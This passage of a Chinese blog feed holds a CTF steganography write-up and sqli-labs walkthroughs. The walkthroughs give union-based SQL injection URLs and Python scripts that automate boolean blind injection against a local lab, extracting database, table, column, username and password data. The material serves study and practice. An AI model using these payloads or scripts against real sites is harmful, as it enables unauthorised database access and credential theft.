alt="在这里插入图片描述"><br>解密成功<br><img src="http://img-blog.csdnimg.cn/20190730180204398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开txt文档 得到flag<br><img src="http://img-blog.csdnimg.cn/20190730180401502.png" alt="在这里插入图片描述"><br><strong>2、论剑</strong><br><img src="http://img-blog.csdnimg.cn/20190730221305476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这题也挺有意思的，下载文件打开是张图：<br><img src="http://img-blog.csdnimg.cn/20190731170714189.jpg" alt="在这里插入图片描述"><br>老套路，先右键查看详细信息， Stegsolve里看下，没啥信息；再WinHex里查看下，发现一串二进制数<br><img src="http://img-blog.csdnimg.cn/20190731171453940.png" alt="在这里插入图片描述"><br>8个一组转成ASCII码值，得到<code>mynameiskey!!!hhh</code>   先留着肯定有用；binwalk里跑一波 ，也没啥东西<br><img src="http://img-blog.csdnimg.cn/20190731210932937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>去修改下文件宽高看看， 右键查看详细信息<br><img src="http://img-blog.csdnimg.cn/20190731211304882.png" alt="在这里插入图片描述"><br>JPG图片<code>FFC2</code>后面三个字节即为高与宽（注意是高与宽哦），然后再winhex里<strong>Ctrl+Alt+x</strong> 搜索16进制文件找到<code>FFC2</code>（小白提醒，搜索的时候要大写字母）<br><img src="https://img-blog.csdnimg.cn/20190731222234592.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190731222655375.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>将781转换为16进制为<code>030D</code>，66转换为16进制为<code>42</code>，找到后把0042改为030D保存打开<br><img src="http://img-blog.csdnimg.cn/20190731222850211.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>emm… 发现有些地方被遮住了，继续找吧，肯定还有线索；无奈看了下别人的blog，才知道那串二进制后面的数值是7Z文件的文件头，不过要修复下<br><img src="http://img-blog.csdnimg.cn/20190731230519799.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/2019073123041266.png" alt="在这里插入图片描述"><br>将38改为37 7B改成7A，保存，在用binwalk跑一波，发现果然有了个压缩包<br><img src="http://img-blog.csdnimg.cn/20190731231218431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>dd命令分离<br><img src="http://img-blog.csdnimg.cn/20190731231736435.png" alt="在这里插入图片描述"><br>打开是一张加密的图，那先前解出来应该就是密码，输入密码，成功打开<br><img src="http://img-blog.csdnimg.cn/20190731231744452.jpg" alt="在这里插入图片描述">再次更改高度查看，得到：<br><img src="http://img-blog.csdnimg.cn/20190731231857871.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>合在一起为<code>f666C61677B6D795F6E616D655F482121487D</code> 目测为base16 解码得：<code>flag&#123;my_name_H!!H&#125;</code>，啊，好累啊，写完睡觉。。。</p><p><strong>3、图穷匕见</strong><br><img src="http://img-blog.csdnimg.cn/20190801192229654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载打开是张图，先看下详细信息，发现了这个：<br><img src="http://img-blog.csdnimg.cn/20190801192339178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>画图题？，接着放进winhex里查看，这里可以看到有很多16进制数。把他们复制下来（全选然后双击）<br><img src="http://img-blog.csdnimg.cn/20190801195504794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后再notepad++里hex→ascii<br><img src="http://img-blog.csdnimg.cn/20190801200007455.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到一串坐标，之后就好办了，把括号和逗号替换掉，保存。<img src="http://img-blog.csdnimg.cn/20190801200233616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>另存为txt文件，接下来使用一个画图工具：gnuplot（自己百度吧 下载地址很多的）把txt文件拖进bin目录下，然后执行命令：<br>plot”文件名.txt”</p><p><img src="http://img-blog.csdnimg.cn/20190801200402664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>回车：</p><p><img src="http://img-blog.csdnimg.cn/20190801200446697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫描二维码得到<code>flag&#123;40fc0a979f759c8892f4dc045e28b820&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labs闯关 Bool盲注详解!（Less-8）</title>
      <link href="2019/07/29/Sqli-labs%E9%97%AF%E5%85%B3%20Bool%E7%9B%B2%E6%B3%A8%E8%AF%A6%E8%A7%A3%EF%BC%88Less-8%EF%BC%89/"/>
      <url>2019/07/29/Sqli-labs%E9%97%AF%E5%85%B3%20Bool%E7%9B%B2%E6%B3%A8%E8%AF%A6%E8%A7%A3%EF%BC%88Less-8%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>介绍了bool盲注的原理，以及使用脚本盲注，关于burp抓包，过段时间会补上。</p><a id="more"></a><p>   前篇write up介绍了Less8的上传木马，连接菜刀的做法；那这次记录下这题关于盲注的做法；先来简单介绍下盲注。</p><p>何为盲注？盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。盲注主要分为三类</p><blockquote><p>•基于布尔 SQL 盲注<br>•基于时间的 SQL 盲注<br>•基于报错的 SQL 盲注</p></blockquote><p> 那这题呢就先介绍下使用bool型盲注吧。（也可以用时间的盲注，报错注入是不行的，因为报错信息被注释了）<br><img src="http://img-blog.csdnimg.cn/20190729142641495.png" alt="在这里插入图片描述"><br>先了解下盲注常用的几个函数：</p><ul><li>database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</li><li>substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。</li><li>mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位</li><li>length()函数可返回字符串的长度</li><li>Ascii()将某个字符转换为 ascii 值</li><li>char()函数可将ASCII码转换为对应的字符</li></ul><p>好，知道了这些就去实战试试吧。</p><p><strong>Less-8</strong> 布尔型单引号GET盲注<br><img src="http://img-blog.csdnimg.cn/20190727231427549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示了为单引号注入，测试下<br><img src="http://img-blog.csdnimg.cn/20190729160005474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>加单引号报错，加上注释符回显正常，闭合方式确实是<code>&#39;</code><br>1）利用 left(database(),1)进行尝试</p><pre><code>127.0.0.1/sqli-labs-master/Less-8?id=1&#39; and left(version(),1)=5 %23</code></pre><p>查看一下 version()，数据库的版本号为 5.6.17，这里的语句的意思是看版本号的第一位是<br>不是 5，显然 返回的结果是正确的。<br><img src="http://img-blog.csdnimg.cn/20190729162211883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2）接下来看一下数据库的长度<br>    <code>127.0.0.1/sqli-labs-master/Less-8?id=1&#39;and length(database())=8 %23</code><br><img src="http://img-blog.csdnimg.cn/20190729162613631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>长度为 8 时，返回正确结果，说明长度为 8；这里说明下，长度要一个一个的试，我这里是验证下，在要爆信息不多的情况下可以手动试试（二分法可以提高很多效率），太多的话就建议用脚本，或者用burp 爆破。后面会为大家展示╰(￣ω￣ｏ)<br>3）猜数据库名字<br>首先猜测数据库第一位,这里使用了<code>left</code>函数   <code>left(a,b)</code>,返回a字符串靠左至b位数，详细看下面用法<br><code>127.0.0.1/sqli-labs-master/Less-8?id=1&#39;and left(database(),1)&gt;&#39;a&#39;  --+</code><br><img src="http://img-blog.csdnimg.cn/201907291700425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Database()为 security，所以我们看他的第一位是否 <code>&gt; a</code>,很明显的是 <code>s &gt; a</code>,因此返回正确。当<br>我们不知情的情况下，可以用二分法来提高注入的效率。<br>继续爆第二位的话，代码如下：</p><pre><code>127.0.0.1/sqli-labs-master/Less-8?id=1&#39;and left(database(),2)&gt;&#39;sa&#39;--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190729171002737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后第三位，第四位…   很麻烦，正经人谁用这啊，你用吗，反正我不用（手动滑稽）<br>这里还可以构造这样的命令 猜解数据库第一位 ：<br><code>127.0.0.1/sqli-labs-master/Less-8 ?id=1&#39; and ascii(substr((database()),1,1)) &gt;80--+</code><br>第二位：<br><code>127.0.0.1/sqli-labs-master/Less-8 ?id=1&#39; and ascii(substr((database()),2,1)) &gt;80 --+</code></p><p>格式就是这样，但这样的效率真的很…下面就演示下使用脚本盲注和burp爆破。╰(￣ω￣ｏ)</p><p>大佬的脚本（目前还不会写╯︿╰） 爆数据库 ：</p><pre><code># -*- coding:utf8 -*-import requestsurl = &#39;http://localhost/sqli-labs-master/sqli-labs-master/Less-8/?id=1%27&#39;  # 这个url要对应你自己的urlpayload = &quot; and%20left(&#123;d&#125;(),&#123;n&#125;)=%27&#123;s&#125;%27%20--%20k&quot;# 上面两个可以合并为一个,但没有必要,(本来就是我拆开的)list1 = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;,         &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;@&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;0&#39;]  # 字典str1 = &quot;You are in...........&quot;  # 就是通过返回的页面里有没有这个字符串来判断盲注有没有成功# 开始对比database()database = &#39;&#39;for i in range(1, 10):  # 相当于C语言的for循环1~9 其实这里应该先判断database有多长的    for ss in list1:  # 相当于for循环遍历list,然后把每一项赋值给ss        p = payload.format(d=&#39;database&#39;, n=i, s=database+ss)  # 把payload里的&#123;d&#125;,&#123;n&#125;,&#123;s&#125;赋值        u = requests.get(url+p)  # 访问网页        # print p        if str1 in u.content:  # 如果str在网页内容里面            database += ss            print u&quot;正在对比database第&quot;, i, u&quot;个字符&quot;,            print database            breakprint u&quot;对比成功,database为:&quot;, database# 开始对比user()#user也是同理user = &#39;&#39;for i in range(1, 20):    for ss in list1:        p = payload.format(d=&#39;user&#39;, n=i, s=user+ss)        u = requests.get(url+p)        # print p        if str in u.content:            user += ss            print u&quot;正在对比user第&quot;, i, u&quot;个字符&quot;,            print user            breakprint u&quot;对比成功,user为:&quot;, userprint u&quot;database--&gt;&quot;, databaseprint u&quot;user--&gt;&quot;, usera = raw_input()</code></pre><p>爆破成功<br><img src="http://img-blog.csdnimg.cn/20190729180251990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来猜解表</p><pre><code># -*- coding:utf8 -*-import requestsurl = &#39;http://127.0.0.1/sqli-labs-master/Less-8?id=1%27&#39;payload = &#39;and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=&#39; \          &#39;database()%20limit%20&#123;t&#125;,1),&#123;w&#125;,1))=&#123;A&#125;%20--%20k&#39;# 我把上面的substr改成了substring按理说mysql里substring和substr是一样的但是如果出错了记得改回substrlist1 = [64, 94, 96, 124, 176, 40, 41, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 173, 175, 95, 65, 66, 67, 68, 69, 70, 71,         72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 103,         104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 44]str1 = &quot;You are in...........&quot;tables1 = &#39;&#39;tables2 = &#39;&#39;tables3 = &#39;&#39;tables4 = &#39;&#39;for i in range(0, 4):   //这里要视情况而定,表的数量不定    for j in range(1, 10):        for s in list1:            p = payload.format(t=i, w=j, A=s)            u = requests.get(url+p)            if str1 in u.content:                if i == 0:                    tables1 += chr(s)                    print u&quot;正在对比第1个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;,tables1                elif i == 1:                    tables2 += chr(s)                    print u&quot;正在对比第2个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;, tables2                elif i == 2:                    tables3 += chr(s)                    print u&quot;正在对比第3个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;, tables3                elif i == 3:                    tables4 += chr(s)                    print u&quot;正在对比第4个表,&quot;, u&quot;第&quot;, j, u&quot;个字符&quot;, tables4                    breakprint &#39;tables1--&gt;&#39;, tables1print &#39;tables2--&gt;&#39;, tables2print &#39;tables3--&gt;&#39;, tables3print &#39;tables4--&gt;&#39;, tables4a = raw_input()</code></pre><p><img src="http://img-blog.csdnimg.cn/20190729192033844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后盲注users的字段名：</p><pre><code># -*- coding:utf8 -*-import requestslist1 = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;,          &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;@&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;0&#39;, &#39;!&#39;, &#39;-&#39;, &#39;|&#39;, &#39;_&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;,          &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;,          &#39;Z&#39;, &#39;.&#39;]  # 字典url = &#39;http://127.0.0.1/sqli-labs-master/Less-8?id=1%27&#39;payload = &#39;%20and%20left((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27security&#39; \          &#39;%27%20and%20table_name=%27users%27%20limit%20&#123;w&#125;,1),&#123;n&#125;)=%27&#123;c&#125;%27%20--%20k&#39;# payload其实就是url的后半部分,也是盲注的关键代码,也可以和url变量合并column = [&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;]str = &#39;You are in...........&#39;# 以上四个变量就是与本次盲注相关的变量了for j in range(0, 3):    for i in range(1, 9):        for l in list1:            p = payload.format(w=j, n=i, c=column[j]+l)            u = requests.get(url+p)            if str in u.content:                column[j] += l                print u&#39;正在对比第&#39;, j+1, u&#39;个字段第&#39;, i, u&#39;个字符&#39;, column[j]                breakfor c in range(0, 5):    print &#39;column&#39;, c+1, &#39;--&gt;&#39;, column[c]a = raw_input()</code></pre><p><img src="http://img-blog.csdnimg.cn/20190729192721615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后就是查看数据了</p><pre><code># -*- coding:utf8 -*-import requestslist1 = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;,          &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;@&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;0&#39;, &#39;!&#39;, &#39;-&#39;, &#39;|&#39;, &#39;_&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;,          &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;,          &#39;Z&#39;, &#39;.&#39;]  # 字典url = &#39;http://127.0.0.1/sqli-labs-master/Less-8?id=1%27&#39;payload = &#39;%20and%20left((select%20username%20from%20users%20where%20id%20=&#123;n&#125;),&#123;w&#125;)=%27&#123;d&#125;%27%20--%20k&#39;str = &#39;You are in...........&#39;username = [&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;]password = [&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;]for i in range(1, 15):    for j in range(1, 11):        for l in list1:            p = payload.format(n=i, w=j, d=username[i-1]+l)            u = requests.get(url+p)            if str in u.content:                username[i-1] += l                print u&#39;正在对比第&#39;, i, u&#39;个记录的username的第&#39;, j, u&#39;个字符&#39;, username[i-1]payload2 = &#39;%20and%20left((select%20password%20from%20users%20where%20id%20=&#123;n&#125;),&#123;w&#125;)=%27&#123;d&#125;%27%20--%20k&#39;for i in range(1, 15):    for j in range(1, 11):        for l in list1:            p = payload2.format(n=i, w=j, d=password[i-1]+l)            u = requests.get(url+p)            if str1 in u.content:                password[i-1] += l                print u&#39;正在对比第&#39;, i, u&#39;个记录的password的第&#39;, j, u&#39;个字符&#39;, password[i-1]print &#39;id    username    password&#39;for i in range(1, 15):    print i, &#39;-&#39;, username[i-1], &#39;-&#39;, password[i-1]a = raw_input()</code></pre><p><img src="http://img-blog.csdnimg.cn/20190729215820731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190729215835960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用脚本盲注基本就是这些了，关于burp爆破就过段时间在写吧。(●’◡’●)</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> Sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labs闯关记录(Less1—8) 详细！</title>
      <link href="2019/07/28/Sqli-labs%E9%97%AF%E5%85%B3(Less1%E2%80%948)%20%E8%AF%A6%E7%BB%86%EF%BC%81/"/>
      <url>2019/07/28/Sqli-labs%E9%97%AF%E5%85%B3(Less1%E2%80%948)%20%E8%AF%A6%E7%BB%86%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>Less 1—8<br>日后慢补！(●’◡’●)</p><a id="more"></a><p>补课补课<br><strong>Less-1</strong><br>根据题目提示为单引号注入，先测试一下<br><img src="http://img-blog.csdnimg.cn/20190604202334654.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>果然报错了，说明我们添加的单引号被数据库成功解析，那我们就可以通过闭合id这个参数 ,然后构造自己的sql语句进行攻击。一般可以使用联合表的方式来提取自己想要的信息（union），但是使用union语句有个前提就是union 后面的语句必须与前面的语句字段数以及类型必须一直，否则数据库会报错。<br>那么知道这个我们就开始查字段吧<br>确定字段数一般可以使用order by 语句：<br><code>http://localhost/sqlilabs/Less-1/?id=1&#39;order by 1 %23</code><br>执行成功<br><code>http://localhost/sqlilabs/Less-1/?id=1&#39; order by 2 %23</code><br>执行成功<br><code>http://localhost/sqlilabs/Less-1/?id=1&#39; order by 3 %23</code><br>执行成功<br><code>http://localhost/sqlilabs/Less-1/?id=1&#39; order by 4 %23</code><br>报错：<br><img src="http://img-blog.csdnimg.cn/20190609193657260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>//注意这里使用  <code>#</code> 是不行的，游览器没有帮我们编码，所以我们自己编<br>   <code>%23</code> 为<code>#</code>的url编码，<code>--+</code>可以直接使用//</p><p>   即只有三个字段，那么现在开始联合查询：<br>   因为sql语句的执行结果<strong>只有第一行</strong>会被回显在页面上，所以我们要把原始语句的的结果集变为空，这样我们想要的结果才能显示在界面上<br>   同时又需要确定哪几个字段会被显示在页面上：<br>   <img src="https://img-blog.csdnimg.cn/20190609195252896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   可以看出2，3字段被显示出来，<br>   接着爆数据库<img src="https://img-blog.csdnimg.cn/20190609195604428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   看到数据库名为：<strong>security</strong>，接着再查其他信息</p><pre><code>   http://localhost/sqli-labs/Less-1/?id=&#39;union select 1,2,concat_ws((char(32,58,32)),user(),database(),version())--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190609201140811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>   这里我使用了<strong>concat_ws()</strong> 函数：<br>  concat_ws(separator,str1,str2,…)<br>  第一个参数是其它参数的分隔符。分隔符的位置放在要连 接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。<br>ps:<br> select concat_ws(‘,’,’11’,’22’,’33’);   　11,22,33<br> **group_concat()**： 使多行数据在一列显示<br> char(32,58,32)对应ascill码为<code>空格：空格</code><br>user():返回当前数据库连接使用的用户<br>database():返回当前数据库连接使用的数据库<br>version():返回当前数据库的版本<br>我们还要知道在Mysql中有information_schema这个库，该库存放了所有数据库的信息。</p><pre><code>information_schema.columns包含所有表的字段information_schema.tables包含所有库的表名information_schema.schemata包含所有数据库的名table_schema 数据库名table_name 表名column_name 列名schema_name 数据库名</code></pre><p>OK 得到这些信息之后我们再来看看数据库有哪些表</p><pre><code>http://localhost/sqli-labs/Less-1/?id=&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></pre><p><img src="http://img-blog.csdnimg.cn/2019060920432537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到有四张表，我们想要的信息基本都在<strong>user</strong>表下<br>我们对这张表爆列名：</p><pre><code>http://localhost/sqli-labs/Less-1/?id=0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190609211043656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>  接着进行爆用户信息</p><p><code>?id=0&#39; union select 1,group_concat(username),group_concat(password) from users --+</code></p><p><img src="http://img-blog.csdnimg.cn/20190609211207363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>或者单独爆一个人</p><pre><code>?id=-1&#39;union select 1,username,password from users where id=2 --+</code></pre><p><img 